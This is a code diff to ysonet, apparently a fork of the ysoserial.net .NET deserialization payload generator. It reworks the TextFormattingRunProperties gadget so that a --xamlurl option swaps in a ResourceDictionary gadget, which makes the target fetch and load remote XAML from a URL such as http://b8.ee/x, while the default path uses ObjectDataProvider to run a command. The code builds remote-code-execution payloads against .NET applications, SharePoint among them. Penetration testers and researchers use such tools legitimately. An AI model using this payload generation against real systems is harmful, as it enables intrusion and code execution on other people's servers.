@@ -80,7 +80,7 @@ namespace ysonet.Generators
         {
             OptionSet options = new OptionSet()
             {
-                {"xamlurl=", "This is to create a very short payload when affected box can read the target XAML URL e.g. \"http://b8.ee/x\" (can be a file path on a shared drive or the local system). This is used by the 3rd XAML payload of ObjectDataProvider which is a ResourceDictionary with the Source parameter. Command parameter will be ignored. The shorter the better!", v => xaml_url = v },
+                {"xamlurl=", "This is to create a very short payload when the affected box can read the target XAML URL e.g. \"http://b8.ee/x\" (can be a UNC path on a shared drive or a path on the local system). It carries the ResourceDictionary gadget instead of ObjectDataProvider, so the target FETCHES and loads that URL rather than running a command, and the command parameter is ignored. The shorter the better!", v => xaml_url = v },
                 {"hasRootDCS", "To include a root element with the DataContractSerializer payload.", v => hasRootDCS = v != null },
             };
 
@@ -147,8 +147,12 @@ namespace ysonet.Generators
 
             if (xaml_url != "")
             {
-                // this is when it comes from GenerateWithInit 
-                inputArgs.ExtraInternalArguments = new List<String> { "--variant", "3", "--xamlurl", xaml_url };
+                // this is when it comes from GenerateWithInit.
+                // Carries the URL down to TextFormattingRunPropertiesGadget, which swaps the
+                // inner gadget for ResourceDictionary. Only the URL travels: the number that
+                // used to sit here selected ObjectDataProvider variant 3, which no longer
+                // exists.
+                inputArgs.ExtraInternalArguments = new List<String> { XamlUrlArgument, xaml_url };
             }
 
             //SerializersHelper.ShowAll(TextFormattingRunPropertiesGadget(inputArgs));
@@ -315,10 +319,15 @@ namespace ysonet.Generators
             return TextFormattingRunPropertiesGadget(inputArgs);
         }
 
+        // The steering token this gadget puts in ExtraInternalArguments when --xamlurl was
+        // used, and that TextFormattingRunPropertiesGadget reads back to pick the inner
+        // gadget. A const so the writer and the reader cannot drift apart; SharePointPlugin's
+        // --useurl mode sets the same token.
+        internal const string XamlUrlArgument = "--xamlurl";
+
         public static object TextFormattingRunPropertiesGadget(InputArgs inputArgs)
         {
-            ObjectDataProviderGenerator myObjectDataProviderGenerator = new ObjectDataProviderGenerator();
-            string xaml_payload = myObjectDataProviderGenerator.GenerateInner("xaml", inputArgs).ToString();
+            string xaml_payload = InnerXamlDocument(inputArgs);
 
             if (inputArgs.Minify)
             {
@@ -327,6 +336,42 @@ namespace ysonet.Generators
 
             TextFormattingRunPropertiesMarshal payload = new TextFormattingRunPropertiesMarshal(xaml_payload);
             return payload;
+        }
+
+        // The XAML document this gadget carries in ForegroundBrush.
+        //
+        // Normally ObjectDataProvider, which runs the command. When a caller asked for the
+        // URL form (--xamlurl here, --useurl on the SharePoint plugin) the payload instead
+        // makes the target FETCH markup, which is the ResourceDictionary gadget - so the URL
+        // becomes that gadget's -c and nothing else about this gadget changes.
+        private static string InnerXamlDocument(InputArgs inputArgs)
+        {
+            string url = XamlUrlFrom(inputArgs);
+            if (url == null)
+                return new ObjectDataProviderGenerator().GenerateInner("xaml", inputArgs).ToString();
+
+            // -c IS the URI for ResourceDictionary, and it must arrive exactly as typed, so
+            // the command is replaced and marked raw (nothing splits it into file+arguments).
+            // The steering token is dropped so the inner gadget cannot see an option of ours.
+            InputArgs urlArgs = inputArgs.DeepCopy();
+            urlArgs.ExtraInternalArguments = new List<String>();
+            urlArgs.Cmd = url;
+            urlArgs.IsRawCmd = true;
+            return new ResourceDictionaryGenerator().GenerateInner("xaml", urlArgs).ToString();
+        }
+
+        // The value that follows XamlUrlArgument in ExtraInternalArguments, or null when the
+        // caller did not ask for the URL form.
+        private static string XamlUrlFrom(InputArgs inputArgs)
+        {
+            List<String> args = inputArgs == null ? null : inputArgs.ExtraInternalArguments;
+            if (args == null)
+                return null;
+
+            for (int i = 0; i < args.Count - 1; i++)
+                if (String.Equals(args[i], XamlUrlArgument, StringComparison.OrdinalIgnoreCase))
+                    return args[i + 1];
+            return null;
         }
     }
 }
